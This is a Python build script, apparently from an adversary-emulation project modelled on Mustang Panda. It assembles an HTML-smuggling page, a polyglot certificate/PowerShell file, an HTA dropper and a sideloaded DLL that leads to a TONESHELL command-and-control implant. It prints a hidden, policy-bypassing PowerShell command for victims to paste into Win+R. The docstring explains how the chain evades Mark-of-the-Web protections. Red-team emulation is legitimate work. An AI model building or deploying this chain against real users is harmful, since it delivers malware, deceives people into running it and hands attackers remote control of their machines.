"""
build.py - Build the HTML-smuggling -> polyglot -> HTA delivery variant (Step 1C).

Chain:
    staging.html                  (HTML smuggling page, served by the operator)
        -> reconstructs Essos_Compliance_Update.txt client-side (no server GET)
    Essos_Compliance_Update.txt   (polyglot PEM / PowerShell, saved to Downloads)
        -> the user pastes the Win+R command; powershell.exe reads the file,
           base64-decodes it to %TEMP%\\Essos_Compliance_Update.bin, renames it
           to .hta and runs it with mshta.exe
    Essos_Compliance_Update.hta   (executed by mshta.exe)
        -> drops EssosUpdate.exe + wsdapi.dll to %TEMP% and runs the loader
    EssosUpdate.exe -> wsdapi.dll sideload -> TONESHELL C2 (unchanged Step 1 chain)

The browser only saves an inert .txt. The .hta is created by powershell.exe, so it
carries no Mark-of-the-Web and mshta runs it in the Local Machine zone, where
ADODB.Stream (used by the HTA to drop the loader) is not blocked.

Steps:
    1. Read EssosUpdate.exe and wsdapi.dll -> stage1.hta (ADODB drops them).
    2. Wrap base64(stage1.hta) in a polyglot PEM/PowerShell file
       -> Essos_Compliance_Update.txt
    3. Base64-encode the .txt and inject it into staging.tpl.html -> staging.html

Usage:
    python build.py
"""

import base64
import os
import textwrap

HERE = os.path.dirname(os.path.abspath(__file__))
TONESHELL = os.path.normpath(os.path.join(
    HERE, "..", "..", "rce-and-c2", "mustang-panda-emulation", "toneshell-v2"))

EXE_PATH = os.path.join(TONESHELL, "EssosUpdate.exe")
DLL_PATH = os.path.join(TONESHELL, "build", "src", "wsdapi", "Release", "wsdapi.dll")

HTA_TPL  = os.path.join(HERE, "stage1.tpl.hta")
HTML_TPL = os.path.join(HERE, "staging.tpl.html")
HTA_OUT  = os.path.join(HERE, "stage1.hta")
TXT_OUT  = os.path.join(HERE, "Essos_Compliance_Update.txt")
HTML_OUT = os.path.join(HERE, "staging.html")

SMUGGLED_NAME = "Essos_Compliance_Update.txt"
BIN_NAME      = "Essos_Compliance_Update.bin"
DROP_NAME     = "Essos_Compliance_Update.hta"

PEM_HEADER = "-----BEGIN CERTIFICATE-----"
PEM_FOOTER = "-----END CERTIFICATE-----"


def b64_of(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode("ascii")


def build_winr_command():
    return ("powershell -w h -ep bypass -c "
            "\"iex(gc -Raw '%USERPROFILE%\\Downloads\\" + SMUGGLED_NAME + "')\"")


def build_ps_decoder():
    return (
        "$f=Join-Path $env:USERPROFILE Downloads\\" + SMUGGLED_NAME + ";"
        "$s=((Get-Content $f"
        "|Where-Object{$_ -match '^[A-Za-z0-9+/=]+$'}"
        "|Out-String) -replace '[\\r\\n]','');"
        "$bt=[Text.Encoding]::ASCII.GetBytes($s);"
        "$x=New-Object Security.Cryptography.FromBase64Transform;"
        "$m=New-Object IO.MemoryStream;"
        "$c=New-Object Security.Cryptography.CryptoStream"
        "($m,$x,[Security.Cryptography.CryptoStreamMode]::Write);"
        "$c.Write($bt,0,$bt.Length);$c.FlushFinalBlock();"
        "$tb=Join-Path $env:TEMP " + BIN_NAME + ";"
        "[IO.File]::WriteAllBytes($tb,$m.ToArray());"
        "$th=Join-Path $env:TEMP " + DROP_NAME + ";"
        "if(Test-Path $th){Remove-Item $th -Force};"
        "Rename-Item $tb $th;"
        "mshta.exe $th"
    )


def build_polyglot(hta_bytes):
    b64 = base64.b64encode(hta_bytes).decode("ascii")
    wrapped = textwrap.wrap(b64, 64)
    return (
        "<#\n"
        + PEM_HEADER + "\n"
        + "\n".join(wrapped) + "\n"
        + PEM_FOOTER + "\n"
        + "#>\n"
        + build_ps_decoder() + "\n"
    )


def main():
    for p in (EXE_PATH, DLL_PATH):
        if not os.path.exists(p):
            raise SystemExit(f"[!] missing input: {p}")

    exe_b64 = b64_of(EXE_PATH)
    dll_b64 = b64_of(DLL_PATH)

    with open(HTA_TPL, "r", encoding="utf-8") as f:
        hta = f.read()
    hta = hta.replace("@@EXE_B64@@", exe_b64).replace("@@DLL_B64@@", dll_b64)
    with open(HTA_OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write(hta)
    print(f"[+] {os.path.basename(HTA_OUT):<30} {len(hta):>10,} bytes")

    polyglot = build_polyglot(hta.encode("utf-8"))
    with open(TXT_OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write(polyglot)
    print(f"[+] {os.path.basename(TXT_OUT):<30} {len(polyglot):>10,} bytes")

    txt_b64 = base64.b64encode(polyglot.encode("utf-8")).decode("ascii")
    with open(HTML_TPL, "r", encoding="utf-8") as f:
        html = f.read()
    html = html.replace("@@TXT_B64@@", txt_b64)
    with open(HTML_OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write(html)
    print(f"[+] {os.path.basename(HTML_OUT):<30} {len(html):>10,} bytes")
    print()
    print("--- paste into Win+R ---")
    print(build_winr_command())


if __name__ == "__main__":
    main()
